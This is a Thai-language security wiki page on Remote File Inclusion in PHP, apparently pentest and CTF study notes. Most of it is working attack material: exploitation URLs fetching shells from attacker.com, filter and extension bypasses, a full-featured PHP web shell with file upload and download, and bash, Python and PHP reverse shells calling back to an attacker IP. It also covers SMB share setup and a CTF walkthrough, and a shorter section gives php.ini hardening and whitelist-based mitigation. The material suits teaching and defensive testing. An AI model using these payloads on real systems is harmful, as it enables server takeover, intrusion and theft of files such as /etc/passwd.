# RFI (Remote File Inclusion)

## What
Remote File Inclusion (RFI) เป็นช่องโหว่ที่อนุญาตให้ attacker สามารถ include ไฟล์จาก remote server ภายนอกเข้ามา execute ในเว็บ application ได้ ซึ่งร้ายแรงกว่า [[LFI (Local File Inclusion)]] เนื่องจาก attacker สามารถควบคุมเนื้อหาของไฟล์ที่จะถูก include ได้ทั้งหมด

RFI มักเกิดขึ้นเมื่อ application ใช้ user input ในการระบุ file path และไม่มีการตรวจสอบ input อย่างเพียงพอ พร้อมทั้ง PHP configuration อนุญาตให้โหลดไฟล์จาก remote URLs (`allow_url_include = On`)

ช่องโหว่นี้มักนำไปสู่ **Remote Code Execution (RCE)** โดยตรง เนื่องจาก attacker สามารถโหลด malicious script จาก server ของตัวเองเข้ามา execute ได้ทันที ทำให้สามารถยึดควบคุม server ได้อย่างสมบูรณ์

## Landmark
- Parameter ที่รับ URL หรือ file path เช่น `?url=`, `?path=`, `?src=`
- Web applications ที่มี `allow_url_include = On` ใน PHP configuration
- Error messages ที่แสดง warnings เกี่ยวกับ `include()`, `require()`, `fopen()`
- Dynamic content loading จาก external sources
- Applications ที่มี file/template loading features
- Plugins หรือ modules ที่โหลดจาก URLs
- URL patterns เช่น `index.php?page=http://...` หรือ `view.php?template=https://...`
- Configuration files ที่มี remote resource loading

## Types

### 1. Basic RFI
การโจมตีแบบพื้นฐานที่ไม่มี filtering ใดๆ

```php
<?php
// โค้ดที่มีช่องโหว่ - รับ URL โดยตรง
$page = $_GET['page'];
include($page);
?>
```

**Exploitation:**
```http
# Include malicious PHP file จาก attacker server
http://target.com/index.php?page=http://attacker.com/shell.php

# ไฟล์ shell.php บน attacker server
<?php system($_GET['cmd']); ?>

# Execute commands
http://target.com/index.php?page=http://attacker.com/shell.php&cmd=whoami
```

### 2. Extension Bypass
เมื่อ application บังคับ extension ที่ท้าย URL

```php
<?php
// โค้ดที่พยายามบังคับ .php extension
$page = $_GET['page'];
include($page . ".php");
?>
```

**Exploitation:**

```http
# Method 1: ใช้ null byte (PHP < 5.3.4)
http://target.com/index.php?page=http://attacker.com/shell.txt%00

# Method 2: ใช้ ? เพื่อทำให้ .php กลายเป็น query string
http://target.com/index.php?page=http://attacker.com/shell.txt?

# Final URL: http://attacker.com/shell.txt?.php
# Web server จะ ignore .php ที่อยู่หลัง ?

# Method 3: ใช้ # (fragment identifier)
http://target.com/index.php?page=http://attacker.com/shell.txt%23
```

### 3. Protocol Bypass
ใช้ protocols อื่นๆ นอกจาก http/https

```php
<?php
// โค้ดที่ filter http:// แต่ลืม protocols อื่น
$page = $_GET['page'];
if (strpos($page, 'http://') === false) {
    include($page);
}
?>
```

**Exploitation:**

```http
# ใช้ HTTPS แทน HTTP
http://target.com/index.php?page=https://attacker.com/shell.php

# ใช้ FTP protocol
http://target.com/index.php?page=ftp://attacker.com/shell.php

# ใช้ SMB protocol (Windows)
http://target.com/index.php?page=\\attacker.com\share\shell.php

# ใช้ data:// protocol
http://target.com/index.php?page=data://text/plain,<?php system($_GET['cmd']); ?>
```

### 4. Filter Evasion
หลบเลี่ยง input filters ที่ไม่สมบูรณ์

```php
<?php
// โค้ดที่ filter http:// แบบ case-sensitive
$page = $_GET['page'];
$page = str_replace("http://", "", $page);
include($page);
?>
```

**Exploitation:**

```http
# ใช้ mixed case
http://target.com/index.php?page=HTtp://attacker.com/shell.php
http://target.com/index.php?page=hTTp://attacker.com/shell.php

# ใช้ double protocol (nested)
http://target.com/index.php?page=hthttp://tp://attacker.com/shell.php
# หลัง str_replace: http://attacker.com/shell.php

# URL encoding
http://target.com/index.php?page=http%3A%2F%2Fattacker.com%2Fshell.php

# Double encoding
http://target.com/index.php?page=%68%74%74%70%3A%2F%2Fattacker.com%2Fshell.php
```

### 5. Wrapper-based RFI
ใช้ PHP wrappers ร่วมกับ RFI

```php
<?php
// โค้ดที่มีช่องโหว่ standard include
$file = $_GET['file'];
include($file);
?>
```

**Exploitation:**

```http
# ใช้ php://input wrapper (รับ POST data)
POST /index.php?file=php://input HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 48

<?php system('cat /etc/passwd'); phpinfo(); ?>

# ใช้ data:// wrapper เข้ารหัส base64
http://target.com/index.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+

# Decoded: <?php system($_GET['cmd']); ?>
```

## Exploitation

### Setting Up Attack Server

```bash
# Setup simple HTTP server ด้วย Python
# สร้าง shell.php
cat > shell.php << 'EOF'
<?php
// Simple web shell
if(isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
} else {
    echo "Shell ready. Use ?cmd=<command>";
}
?>
EOF

# เริ่ม HTTP server บน port 8000
python3 -m http.server 8000

# หรือใช้ PHP built-in server
php -S 0.0.0.0:8000

# Test shell
curl "http://localhost:8000/shell.php?cmd=id"
```

### Advanced Shell Payloads

```php
<?php
// Full-featured web shell สำหรับ RFI
error_reporting(0);
set_time_limit(0);

if(isset($_GET['cmd'])) {
    // Execute system commands
    $cmd = $_GET['cmd'];
    echo "<pre>";
    if(function_exists('system')) {
        system($cmd);
    } elseif(function_exists('exec')) {
        exec($cmd, $output);
        echo implode("\n", $output);
    } elseif(function_exists('shell_exec')) {
        echo shell_exec($cmd);
    } elseif(function_exists('passthru')) {
        passthru($cmd);
    } else {
        echo "No execution function available";
    }
    echo "</pre>";
}

if(isset($_GET['upload'])) {
    // File upload capability
    echo '<form method="POST" enctype="multipart/form-data">';
    echo '<input type="file" name="file" />';
    echo '<input type="submit" name="submit" value="Upload" />';
    echo '</form>';
    
    if(isset($_FILES['file'])) {
        $target = basename($_FILES['file']['name']);
        if(move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
            echo "File uploaded: " . $target;
        }
    }
}

if(isset($_GET['download'])) {
    // File download capability
    $file = $_GET['download'];
    if(file_exists($file)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file).'"');
        readfile($file);
        exit;
    }
}

// Default: show server info
phpinfo();
?>
```

**การใช้งาน:**
```bash
# Execute commands
curl "http://target.com/vuln.php?page=http://attacker.com/shell.php&cmd=whoami"

# Upload files
curl "http://target.com/vuln.php?page=http://attacker.com/shell.php&upload=1"

# Download files
curl "http://target.com/vuln.php?page=http://attacker.com/shell.php&download=/etc/passwd"
```

### Establishing Reverse Shell

```php
<?php
// Reverse shell payload สำหรับ RFI
// บน attacker server: nc -lvnp 4444

$ip = '10.10.10.10';  // Attacker IP
$port = 4444;          // Listener port

if(function_exists('exec')) {
    // Method 1: Bash reverse shell
    exec("/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'");
} elseif(function_exists('shell_exec')) {
    // Method 2: Python reverse shell
    shell_exec("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'");
} else {
    // Method 3: PHP reverse shell
    $sock = fsockopen($ip, $port);
    $proc = proc_open('/bin/sh', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
}
?>
```

**การโจมตี:**
```bash
# Step 1: เปิด listener บน attacker machine
nc -lvnp 4444

# Step 2: Trigger RFI ด้วย reverse shell payload
curl "http://target.com/vuln.php?page=http://attacker.com/revshell.php"

# Step 3: รอรับ connection
# listening on [any] 4444 ...
# connect to [10.10.10.10] from target.com [192.168.1.100]
# $ id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Using Data Protocol

```bash
# สร้าง PHP payload แบบ base64
echo -n '<?php system($_GET["cmd"]); ?>' | base64
# Output: PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+

# ใช้ data:// protocol include payload
curl "http://target.com/vuln.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+&cmd=id"

# หรือใช้แบบไม่ encode
curl "http://target.com/vuln.php?page=data://text/plain,<?php system('whoami'); ?>"
```

### SMB Share Attack (Windows Targets)

```bash
# Setup SMB share บน attacker machine (Linux)
# Install Impacket
pip install impacket

# Create shell.php
cat > /tmp/share/shell.php << 'EOF'
<?php system($_GET['cmd']); ?>
EOF

# Start SMB server
impacket-smbserver share /tmp/share -smb2support

# Exploit RFI ผ่าน SMB
# URL format: \\attacker_ip\share\shell.php
curl "http://target.com/vuln.php?page=\\\\10.10.10.10\\share\\shell.php&cmd=whoami"
```

## Bypass Techniques

### allow_url_include Bypass

เมื่อ `allow_url_include = Off` แต่ `allow_url_fopen = On`

```php
<?php
// โค้ดที่ใช้ file_get_contents แทน include
$page = $_GET['page'];
eval(file_get_contents($page));
?>
```

**Exploitation:**
```http
# Remote code ยังทำงานได้ผ่าน eval
http://target.com/index.php?page=http://attacker.com/payload.txt

# payload.txt contains:
system('cat /etc/passwd');
```

### DNS Rebinding Attack

```bash
# ใช้ DNS rebinding เพื่อ bypass IP whitelist
# Setup DNS ที่ switch ระหว่าง whitelisted IP และ attacker IP

# Initial request: DNS resolves to whitelisted IP (127.0.0.1)
# Second request: DNS resolves to attacker IP (10.10.10.10)

curl "http://target.com/vuln.php?page=http://malicious.attacker.com/shell.php"
```

### Using URL Shorteners

```bash
# ใช้ URL shortener เพื่อ hide malicious URL
# สร้าง shortened URL ที่ชี้ไปยัง attacker server

# bit.ly, tinyurl.com, หรือ self-hosted shortener
curl "http://target.com/vuln.php?page=http://bit.ly/xxxxx"

# URL redirects to: http://attacker.com/shell.php
```

## Protection & Mitigation

### Secure Configuration

```ini
; php.ini - ปิด remote file inclusion
allow_url_fopen = Off
allow_url_include = Off

; Disable dangerous functions
disable_functions = exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source
```

### Secure Coding Practices

```php
<?php
// วิธีที่ปลอดภัย - Whitelist approach
$allowed_pages = array(
    'home' => 'pages/home.php',
    'about' => 'pages/about.php',
    'contact' => 'pages/contact.php'
);

$page = $_GET['page'];

if (array_key_exists($page, $allowed_pages)) {
    include($allowed_pages[$page]);
} else {
    include('pages/error.php');
}

// ห้ามใช้ user input โดยตรงใน include
// ❌ BAD: include($_GET['page']);
// ✓ GOOD: ใช้ mapping/whitelist

// Validate URL scheme ถ้าจำเป็นต้องรับ URL
function validateURL($url) {
    $parsed = parse_url($url);
    
    // Allow only specific schemes
    $allowed_schemes = ['http', 'https'];
    if (!in_array($parsed['scheme'], $allowed_schemes)) {
        return false;
    }
    
    // Validate domain against whitelist
    $allowed_domains = ['trusted-site.com', 'cdn.example.com'];
    if (!in_array($parsed['host'], $allowed_domains)) {
        return false;
    }
    
    return true;
}

$url = $_GET['url'];
if (validateURL($url)) {
    $content = file_get_contents($url);
    // Process content safely (not with include/eval)
} else {
    die("Invalid URL");
}
?>
```

>[!danger] Critical Settings
>- **ปิด `allow_url_include`** ใน php.ini (ต้องปิดเสมอ)
>- **ปิด `allow_url_fopen`** ถ้าไม่จำเป็น
>- ใช้ **whitelist approach** สำหรับ file inclusion
>- **ห้ามใช้** user input โดยตรงใน `include()`, `require()`, `eval()`
>- Implement [[Input Validation]] และ [[Content Security Policy]]

>[!tip] Defense in Depth
>- Deploy [[WAF (Web Application Firewall)]] ที่ detect RFI patterns
>- Monitor outbound connections จาก web server
>- Implement network segmentation
>- Use [[PHP Security]] best practices
>- Regular security audits และ code reviews
>- Log และ alert suspicious URL parameters

## CTF Example: Template Loader Challenge

**Scenario:**
Web application มี template loading feature ที่มีช่องโหว่ RFI

```php
<?php
// template.php
$template = $_GET['t'];
if(isset($template)) {
    // Vulnerable: no validation
    include($template . "_template.php");
}
?>
```

**Attack Walkthrough:**

```bash
# Step 1: ตรวจสอบ vulnerability
curl "http://ctf.example.com/template.php?t=http://attacker.com/test"
# Response: Warning: include(http://attacker.com/test_template.php)

# Step 2: สร้าง payload บน attacker server
cat > shell_template.php << 'EOF'
<?php
echo "RFI Success!\n";
system($_GET['cmd']);
?>
EOF

# Step 3: เริ่ม web server
python3 -m http.server 80

# Step 4: Exploit RFI
curl "http://ctf.example.com/template.php?t=http://10.10.10.10/shell"
# Output: RFI Success!

# Step 5: Execute commands
curl "http://ctf.example.com/template.php?t=http://10.10.10.10/shell&cmd=cat%20/flag.txt"
# Output: flag{rfi_allows_full_remote_code_execution}

# Alternative: ใช้ data:// protocol
PAYLOAD=$(echo -n '<?php system("cat /flag.txt"); ?>' | base64)
curl "http://ctf.example.com/template.php?t=data://text/plain;base64,$PAYLOAD%23"
# %23 = # เพื่อ comment out _template.php
# Output: flag{rfi_allows_full_remote_code_execution}
```

## Related Topics
- [[LFI (Local File Inclusion)]]
- [[Path Traversal]]
- [[Remote Code Execution (RCE)]]
- [[SSRF (Server-Side Request Forgery)]]
- [[PHP Security]]
- [[Web Shells]]
- [[Command Injection]]
- [[File Upload]]

## Tools
- [[Burp Suite]] - Manual RFI testing
- [[OWASP ZAP]] - Automated scanning
- [[Commix]] - Command injection and RFI exploitation
- [[Weevely]] - Web shell generation and management
- [[Metasploit]] - RFI exploitation modules

## References
- [[OWASP]] - Remote File Inclusion
- [[PayloadsAllTheThings]] - RFI payloads
- [[HackTricks]] - RFI techniques and bypass methods

#web #vulnerability #rfi #remote-inclusion #rce #php #exploitation #webshell
